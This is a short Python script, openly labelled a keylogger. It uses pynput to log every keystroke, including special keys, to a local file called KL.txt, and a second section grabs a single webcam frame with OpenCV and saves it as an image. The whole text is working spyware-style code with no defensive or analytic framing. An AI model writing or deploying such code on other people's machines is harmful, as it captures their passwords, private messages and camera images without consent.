# ---------------Keylogger---------------
from pynput.keyboard import Listener

special_keys = {
    "Key.alt": "[Alt]",
    "Key.alt_gr": "[AltGr]",
    "Key.alt_l": "[AltL]",
    "Key.alt_r": "[AltR]",
    "Key.backspace": "[Backspace]",
    "Key.caps_lock": "[CapsLock]",
    "Key.cmd": "[Win]",
    "Key.cmd_r": "[WinR]",
    "Key.ctrl": "[Ctrl]",
    "Key.ctrl_l": "[CtrlL]",
    "Key.ctrl_r": "[CtrlR]",
    "Key.delete": "[Delete]",
    "Key.down": "[Down]",
    "Key.end": "[End]",
    "Key.enter": "[Enter]",
    "Key.esc": "[Escape]",
    "Key.f1": "[F1]",
    "Key.f2": "[F2]",
    "Key.f3": "[F3]",
    "Key.f4": "[F4]",
    "Key.f5": "[F5]",
    "Key.f6": "[F6]",
    "Key.f7": "[F7]",
    "Key.f8": "[F8]",
    "Key.f9": "[F9]",
    "Key.f10": "[F10]",
    "Key.f11": "[F11]",
    "Key.f12": "[F12]",
    "Key.f13": "[F13]",
    "Key.f14": "[F14]",
    "Key.f15": "[F15]",
    "Key.f16": "[F16]",
    "Key.f17": "[F17]",
    "Key.f18": "[F18]",
    "Key.f19": "[F19]",
    "Key.f20": "[F20]",
    "Key.f21": "[F21]",
    "Key.f22": "[F22]",
    "Key.f23": "[F23]",
    "Key.f24": "[F24]",
    "Key.home": "[Home]",
    "Key.insert": "[Insert]",
    "Key.left": "[Left]",
    "Key.media_next": "[MediaNext]",
    "Key.media_play_pause": "[MediaPlayPause]",
    "Key.media_previous": "[MediaPrev]",
    "Key.media_stop": "[MediaStop]",
    "Key.media_volume_down": "[VolDown]",
    "Key.media_volume_mute": "[Mute]",
    "Key.media_volume_up": "[VolUp]",
    "Key.menu": "[Menu]",
    "Key.num_lock": "[NumLock]",
    "Key.page_down": "[PageDown]",
    "Key.page_up": "[PageUp]",
    "Key.pause": "[Pause]",
    "Key.print_screen": "[PrintScreen]",
    "Key.right": "[Right]",
    "Key.scroll_lock": "[ScrollLock]",
    "Key.shift": "[Shift]",
    "Key.shift_r": "[ShiftR]",
    "Key.space": "[Space]",
    "Key.tab": "[Tab]",
    "Key.up": "[Up]",
    "<96>": "0",      # Numpad 0
    "<97>": "1",      # Numpad 1
    "<98>": "2",      # Numpad 2
    "<99>": "3",      # Numpad 3
    "<100>": "4",     # Numpad 4
    "<101>": "5",     # Numpad 5
    "<102>": "6",     # Numpad 6
    "<103>": "7",     # Numpad 7
    "<104>": "8",     # Numpad 8
    "<105>": "9",     # Numpad 9
}

def on_key_down(key):
    listen = str(key).replace("'", "")
    if special_keys.get(listen):
        listen = special_keys[listen]
    with open("KL.txt", "a") as f:
        f.write(listen)

def on_key_up(key):
    if str(key) == "Key.esc":
        return False

with Listener(on_press=on_key_down, on_release=on_key_up) as listener:
    listener.join()


# ---------------Webcam---------------

import cv2
camera = cv2.VideoCapture(0)
ret, frame = camera.read()
if ret:
    cv2.imwrite("webcam.png", frame)

camera.release()
cv2.destroyAllWindows()